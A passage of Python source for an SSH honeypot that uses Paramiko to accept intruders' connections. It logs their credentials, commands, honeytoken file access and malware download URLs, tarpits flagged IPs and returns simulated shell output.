                            "username": session.get("username", ""),
                            "shell":    True,
                        }))

                    for hf in _FS:
                        if hf in cmd:
                            if log_attack:
                                log_attack(ip, 22, "SSH_HONEYTOKEN", json.dumps({
                                    "file": hf, "command": cmd,
                                }))
                            if log_honeytoken:
                                try:
                                    log_honeytoken(_ts(), ip, "FILE_ACCESS", hf,
                                                   "ssh", "Unknown", "")
                                except Exception:
                                    pass

                    mal = _detect_malware_url(cmd)
                    if mal:
                        if log_attack:
                            log_attack(ip, 22, "SSH_MALWARE", json.dumps({
                                "url":    mal,
                                "command":cmd,
                                "arch":   _detect_arch(cmd),
                                "family": _detect_botnet(" ".join(session["commands"])),
                            }))
                        if log_malware:
                            try:
                                log_malware(_ts(), ip, mal, cmd,
                                            _detect_botnet(" ".join(session["commands"])),
                                            _detect_arch(cmd), "Unknown")
                            except Exception:
                                pass

                    if is_tarpitted:
                        time.sleep(TARPIT_DELAY)

                    output = _execute(cmd)
                    if output:
                        channel.send(output.replace("\n", "\r\n").encode(errors="replace"))

                    channel.send(prompt.encode())

                elif ch in ("\x7f", "\x08"):
                    if buf:
                        buf = buf[:-1]
                        channel.send(b"\x08 \x08")
                elif ch == "\x03":
                    buf = ""
                    channel.send(b"^C\r\n")
                    channel.send(prompt.encode())
                elif ch == "\x04":
                    channel.send(b"logout\r\n")
                    return
                elif ch == "\x1b":
                    pass   # absorb ESC sequences
                else:
                    buf += ch
                    channel.send(ch.encode(errors="replace"))

    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════════
# NON-INTERACTIVE EXEC
# ═══════════════════════════════════════════════════════════════════════════

def _run_exec(channel, command: str, session: dict, ip: str,
              log_attack, is_tarpitted: bool,
              log_malware=None, log_honeytoken=None):
    session["commands"].append(command)

    if log_attack:
        log_attack(ip, 22, "SSH_COMMAND", json.dumps({
            "command":  command,
            "username": session.get("username", ""),
            "exec":     True,
        }))

    for hf in _FS:
        if hf in command:
            if log_attack:
                log_attack(ip, 22, "SSH_HONEYTOKEN", json.dumps({
                    "file": hf, "command": command,
                }))
            if log_honeytoken:
                try:
                    log_honeytoken(_ts(), ip, "FILE_ACCESS", hf,
                                   "ssh", "Unknown", "")
                except Exception:
                    pass

    mal = _detect_malware_url(command)
    if mal:
        if log_attack:
            log_attack(ip, 22, "SSH_MALWARE", json.dumps({
                "url":    mal,
                "command":command,
                "arch":   _detect_arch(command),
                "family": _detect_botnet(command),
            }))
        if log_malware:
            try:
                log_malware(_ts(), ip, mal, command,
                            _detect_botnet(command), _detect_arch(command), "Unknown")
            except Exception:
                pass

    if is_tarpitted:
        time.sleep(TARPIT_DELAY)

    output = _execute(command)
    if output:
        channel.send(output.encode(errors="replace"))

    channel.send_exit_status(0)

# ═══════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

def handle_ssh(conn, addr, log_attack=None, geoip_func=None,
               intel_fields_func=None, new_ip_alert=None,
               track_cred_attempt=None, log_malware=None, log_honeytoken=None):
    """
    Drop-in replacement for the previous handle_ssh().
    Uses Paramiko for real SSH crypto — any client connects successfully.
    Host key is persisted to disk so fingerprint never changes across restarts.
    """
    if not HAS_PARAMIKO:
        try: conn.close()
        except Exception: pass
        return

    ip, port  = addr
    is_tarpit = _should_tarpit(ip)

    session = {
        "authenticated": False,
        "username":      "",
        "password":      "",
        "auth_attempts": 0,
        "commands":      [],
        "start_time":    time.time(),
        "is_tarpitted":  is_tarpit,
    }

    transport = None
    try:
        gdata = geoip_func(ip) if geoip_func else {}

        if log_attack:
            log_attack(ip, 22, "SSH_CONNECT", json.dumps({
                "event":        "connection",
                "country":      gdata.get("country", "Unknown"),
                "city":         gdata.get("city", ""),
                "is_tarpitted": is_tarpit,
            }))

        if new_ip_alert and gdata:
            new_ip_alert(ip, gdata.get("country",""), gdata.get("city",""), "ssh")

        if is_tarpit:
            time.sleep(TARPIT_DELAY * 2)
        else:
            time.sleep(random.uniform(0.05, 0.20))

        # ── Paramiko transport ────────────────────────────────────────────
        transport = paramiko.Transport(conn)
        transport.local_version = random.choice(_BANNERS)
        transport.add_server_key(_get_host_key())

        server = _HoneypotServer(ip, log_attack, session, track_cred_attempt)

        try:
            transport.start_server(server=server)
        except (paramiko.SSHException, EOFError, ConnectionResetError):
            return

        # Log banner exchange
        client_ver = transport.remote_version or ""
        if log_attack:
            log_attack(ip, 22, "SSH_BANNER_EXCHANGE", json.dumps({
                "client_version": client_ver[:200],
                "server_version": transport.local_version,
                "scanner_tool":   _detect_scanner(client_ver),
            }))

        # ── Channel loop ──────────────────────────────────────────────────
        deadline = time.time() + 120
        while time.time() < deadline and transport.is_active():
            server.shell_ev.clear()
            server.exec_cmd = None

            channel = transport.accept(25)
            if channel is None:
                break

            server.shell_ev.wait(15)
            exec_cmd = server.exec_cmd

            if exec_cmd:
                _run_exec(channel, exec_cmd, session, ip, log_attack, is_tarpit,
                          log_malware=log_malware, log_honeytoken=log_honeytoken)
                try: channel.close()
                except Exception: pass
                # Some bots send multiple exec commands — keep looping
                continue
            else:
                _run_shell(channel, session, ip, log_attack, is_tarpit,
                           log_malware=log_malware, log_honeytoken=log_honeytoken)
                try: channel.close()
                except Exception: pass
                break

    except Exception as e:
        if log_attack:
            log_attack(ip, 22, "SSH_ERROR", json.dumps({"error": str(e)[:200]}))
    finally:
        if session["commands"]:
            _save_replay(session)

        if log_attack and (session["commands"] or session["auth_attempts"] > 0):
            log_attack(ip, 22, "SSH_SESSION_END", json.dumps({
                "duration":      round(time.time() - session["start_time"], 2),
                "authenticated": session["authenticated"],
                "username":      session.get("username", ""),
                "password":      session.get("password", ""),
                "auth_attempts": session["auth_attempts"],
                "commands":      session["commands"],
                "command_count": len(session["commands"]),
                "is_tarpitted":  is_tarpit,
            }))

        if transport:
            try: transport.close()
            except Exception: pass
        try: conn.close()
        except Exception: pass